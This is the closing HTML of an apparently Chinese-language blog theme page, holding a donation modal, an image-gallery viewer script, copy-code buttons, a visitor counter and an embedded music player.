</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
        src="//music.163.com/outchain/player?type=2&id=1490078152&auto=1&height=32"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
    

  </div>
</body>

</html>